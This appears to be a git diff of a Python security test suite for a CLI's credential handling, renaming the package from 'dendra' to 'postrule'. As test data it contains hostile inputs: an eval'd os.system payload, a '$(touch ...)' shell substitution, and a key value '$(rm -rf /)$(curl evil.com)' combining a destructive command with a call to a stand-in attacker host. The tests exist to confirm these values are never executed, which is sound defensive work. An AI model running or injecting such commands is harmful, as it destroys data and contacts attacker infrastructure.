@@ -5,7 +5,7 @@
 
 Coverage:
   - Tampered credentials file (malformed JSON, wrong types, missing keys)
-  - DENDRA_API_KEY env-var with shell metacharacters
+  - POSTRULE_API_KEY env-var with shell metacharacters
   - whoami CLI key-truncation must not render shell-active chars unsanitized
   - Missing / expired API key: cloud calls fail with a clear error;
     OSS classification continues to work
@@ -32,15 +32,15 @@ def test_load_credentials_returns_none_on_malformed_json(tmp_path, monkeypatch):
     """A garbled credentials file must not crash; load_credentials
     returns None and the caller treats the user as logged-out.
     """
-    from dendra import auth
+    from postrule import auth
 
-    cred_dir = tmp_path / ".dendra"
+    cred_dir = tmp_path / ".postrule"
     cred_dir.mkdir()
     cred_path = cred_dir / "credentials"
     cred_path.write_text("{this is not json")
 
     # Ensure no env-var fallback masks the file.
-    monkeypatch.delenv("DENDRA_API_KEY", raising=False)
+    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
 
     creds = auth.load_credentials()
     assert creds is None
@@ -48,10 +48,10 @@ def test_load_credentials_returns_none_on_malformed_json(tmp_path, monkeypatch):
 
 def test_load_credentials_returns_none_on_non_dict_payload(tmp_path, monkeypatch):
     """JSON that's a list / number / string instead of a dict: refuse cleanly."""
-    from dendra import auth
+    from postrule import auth
 
-    monkeypatch.delenv("DENDRA_API_KEY", raising=False)
-    cred_dir = tmp_path / ".dendra"
+    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
+    cred_dir = tmp_path / ".postrule"
     cred_dir.mkdir()
 
     for payload in ("[]", "42", '"a-string"', "null", "true"):
@@ -61,10 +61,10 @@ def test_load_credentials_returns_none_on_non_dict_payload(tmp_path, monkeypatch
 
 def test_load_credentials_returns_none_on_missing_api_key(tmp_path, monkeypatch):
     """JSON dict without an api_key field: refuse cleanly."""
-    from dendra import auth
+    from postrule import auth
 
-    monkeypatch.delenv("DENDRA_API_KEY", raising=False)
-    cred_dir = tmp_path / ".dendra"
+    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
+    cred_dir = tmp_path / ".postrule"
     cred_dir.mkdir()
     (cred_dir / "credentials").write_text(json.dumps({"email": "user@x"}))
     assert auth.load_credentials() is None
@@ -75,11 +75,11 @@ def test_load_credentials_does_not_eval_payload(tmp_path, monkeypatch):
     NOT be eval'd. We pin this by shipping a payload that, if
     eval'd, would write a sentinel file.
     """
-    from dendra import auth
+    from postrule import auth
 
     sentinel = tmp_path / "would-have-evaled"
-    monkeypatch.delenv("DENDRA_API_KEY", raising=False)
-    cred_dir = tmp_path / ".dendra"
+    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
+    cred_dir = tmp_path / ".postrule"
     cred_dir.mkdir()
     payload = {
         "api_key": f"__import__('os').system('touch {sentinel}')",
@@ -95,22 +95,22 @@ def test_load_credentials_does_not_eval_payload(tmp_path, monkeypatch):
 
 
 # ---------------------------------------------------------------------
-# DENDRA_API_KEY env var: opaque, never shell-interpolated
+# POSTRULE_API_KEY env var: opaque, never shell-interpolated
 # ---------------------------------------------------------------------
 
 
-def test_dendra_api_key_env_var_treated_as_opaque(monkeypatch, tmp_path):
-    """A DENDRA_API_KEY containing shell metacharacters must be
+def test_postrule_api_key_env_var_treated_as_opaque(monkeypatch, tmp_path):
+    """A POSTRULE_API_KEY containing shell metacharacters must be
     accepted as opaque text, never passed to a shell.
     """
-    from dendra import auth
+    from postrule import auth
 
     sentinel = tmp_path / "would-have-shelled"
     # Note: shell expansion happens in the SHELL, not in Python's
     # os.environ.get. We're pinning that load_credentials does NOT
     # invoke a shell on the value.
     hostile = f"$(touch {sentinel})"
-    monkeypatch.setenv("DENDRA_API_KEY", hostile)
+    monkeypatch.setenv("POSTRULE_API_KEY", hostile)
 
     creds = auth.load_credentials()
     assert creds is not None
@@ -118,13 +118,13 @@ def test_dendra_api_key_env_var_treated_as_opaque(monkeypatch, tmp_path):
     assert not sentinel.exists()
 
 
-def test_dendra_api_key_with_newlines(monkeypatch):
+def test_postrule_api_key_with_newlines(monkeypatch):
     """A multi-line key must not be silently truncated or split into
     multiple records anywhere downstream.
     """
-    from dendra import auth
+    from postrule import auth
 
-    monkeypatch.setenv("DENDRA_API_KEY", "line1\nline2\nline3")
+    monkeypatch.setenv("POSTRULE_API_KEY", "line1\nline2\nline3")
     creds = auth.load_credentials()
     assert creds is not None
     assert creds["api_key"] == "line1\nline2\nline3"
@@ -136,7 +136,7 @@ def test_dendra_api_key_with_newlines(monkeypatch):
 
 
 def test_whoami_truncation_does_not_leak_shell_chars(monkeypatch, capsys):
-    """``dendra whoami`` prints a truncated key. For a hostile key
+    """``postrule whoami`` prints a truncated key. For a hostile key
     (``$(rm -rf /)``), the 12-char truncation displays the literal
     chars; we don't pass them through a shell, so it's safe.
 
@@ -146,10 +146,10 @@ def test_whoami_truncation_does_not_leak_shell_chars(monkeypatch, capsys):
     """
     import argparse
 
-    from dendra.cli import cmd_whoami
+    from postrule.cli import cmd_whoami
 
     monkeypatch.setenv(
-        "DENDRA_API_KEY",
+        "POSTRULE_API_KEY",
         "$(rm -rf /)$(curl evil.com)abcd1234",
     )
     args = argparse.Namespace()
@@ -166,9 +166,9 @@ def test_whoami_with_extremely_long_key(monkeypatch, capsys):
     """A 1MB key must be truncated for display, not dumped wholesale."""
     import argparse
 
-    from dendra.cli import cmd_whoami
+    from postrule.cli import cmd_whoami
 
-    monkeypatch.setenv("DENDRA_API_KEY", "X" * (1024 * 1024))
+    monkeypatch.setenv("POSTRULE_API_KEY", "X" * (1024 * 1024))
     rc = cmd_whoami(argparse.Namespace())
     assert rc == 0
     out = capsys.readouterr().out
@@ -186,16 +186,16 @@ def test_save_credentials_enforces_0600(home_writable, tmp_path, monkeypatch):
     """save_credentials must leave the file at mode 0600.
 
     Uses ``home_writable`` to opt out of the HOME redirect so we can
-    write to a real ~/.dendra-style path; we override HOME to tmp_path
+    write to a real ~/.postrule-style path; we override HOME to tmp_path
     explicitly.
     """
-    from dendra import auth
+    from postrule import auth
 
     monkeypatch.setenv("HOME", str(tmp_path))
     monkeypatch.setattr(Path, "home", lambda: tmp_path)
 
     auth.save_credentials("secret-key", email="user@x")
-    cred_path = tmp_path / ".dendra" / "credentials"
+    cred_path = tmp_path / ".postrule" / "credentials"
     assert cred_path.exists()
     mode = cred_path.stat().st_mode & 0o777
     assert mode == 0o600, f"credentials file mode is {oct(mode)}, expected 0o600"
@@ -211,12 +211,12 @@ def test_save_credentials_overwrites_world_readable_predecessor(
     BUG FIX (defense-in-depth): the existing implementation chmods after
     write, so a tightening on overwrite is automatic. Test pins it.
     """
-    from dendra import auth
+    from postrule import auth
 
     monkeypatch.setenv("HOME", str(tmp_path))
     monkeypatch.setattr(Path, "home", lambda: tmp_path)
 
-    cred_dir = tmp_path / ".dendra"
+    cred_dir = tmp_path / ".postrule"
     cred_dir.mkdir()
     cred_path = cred_dir / "credentials"
     cred_path.write_text(json.dumps({"api_key": "old", "email": "old@x"}))
@@ -237,9 +237,9 @@ def test_dispatch_works_without_api_key(monkeypatch):
 
     OSS-first: cloud features are opt-in. No credentials, no problem.
     """
-    from dendra import LearnedSwitch
+    from postrule import LearnedSwitch
 
-    monkeypatch.delenv("DENDRA_API_KEY", raising=False)
+    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
     sw = LearnedSwitch(rule=lambda _: "ok", name="oss-no-creds")
     result = sw.dispatch("input")
     assert result.label == "ok"
@@ -255,7 +255,7 @@ def test_cloud_call_with_401_raises_clean_error(monkeypatch):
     raise a clean HTTPError (or surface a clear ``Unauthorized`` /
     ``RuntimeError`` signal). Never a silent success.
     """
-    from dendra.cloud import sync as cloud_sync
+    from postrule.cloud import sync as cloud_sync
 
     class _FakeResp:
         status_code = 401
@@ -305,7 +305,7 @@ def test_cloud_call_with_401_raises_clean_error(monkeypatch):
 
 def test_clear_credentials_idempotent(home_writable, tmp_path, monkeypatch):
     """clear_credentials must be a no-op when the file doesn't exist."""
-    from dendra import auth
+    from postrule import auth
 
     monkeypatch.setenv("HOME", str(tmp_path))
     monkeypatch.setattr(Path, "home", lambda: tmp_path)
@@ -313,15 +313,15 @@ def test_clear_credentials_idempotent(home_writable, tmp_path, monkeypatch):
     # No credentials yet.
     auth.clear_credentials()  # must not raise
     auth.clear_credentials()  # idempotent
-    assert not (tmp_path / ".dendra" / "credentials").exists()
+    assert not (tmp_path / ".postrule" / "credentials").exists()
 
 
 def test_is_logged_in_false_for_empty_payload(tmp_path, monkeypatch):
     """A credentials file with empty api_key string is NOT a valid login."""
-    from dendra import auth
+    from postrule import auth
 
-    monkeypatch.delenv("DENDRA_API_KEY", raising=False)
-    cred_dir = tmp_path / ".dendra"
+    monkeypatch.delenv("POSTRULE_API_KEY", raising=False)
+    cred_dir = tmp_path / ".postrule"
     cred_dir.mkdir()
     (cred_dir / "credentials").write_text(json.dumps({"api_key": "", "email": "x@x"}))
     assert auth.is_logged_in() is False
